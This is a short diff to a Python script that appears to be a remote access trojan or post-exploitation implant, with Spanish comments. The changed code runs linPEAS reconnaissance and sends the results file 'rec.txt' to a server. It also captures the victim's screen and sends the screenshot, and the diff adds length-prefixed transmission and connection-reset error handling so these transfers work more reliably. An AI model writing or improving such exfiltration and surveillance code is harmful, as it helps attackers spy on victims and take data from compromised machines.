@@ -124,7 +124,11 @@ def linPEAS(force):
         stop = False
     else:
         stop = True
-        send(readFile("rec.txt", True))
+        data = readFile("rec.txt", True)
+        sendLen(data)
+        time.sleep(0.5)
+        sendBytes(data)
+        time.sleep(1)
         stop = False
 
 
@@ -186,9 +190,15 @@ def sendLen(dat):
 
 # Captura la pantalla
 def capture_screen():
-    screenshot = pyscreenshot.grab()
-    screenshot.save("screenshot.png")
-    send_screenshot()
+    global stop,conn
+    try:
+        screenshot = pyscreenshot.grab()
+        screenshot.save("screenshot.png")
+        send_screenshot()
+    except Exception as e:
+        logEvents(e)
+        stop = False
+        conn = None
 
 # Envía la captura al servidor
 def send_screenshot():
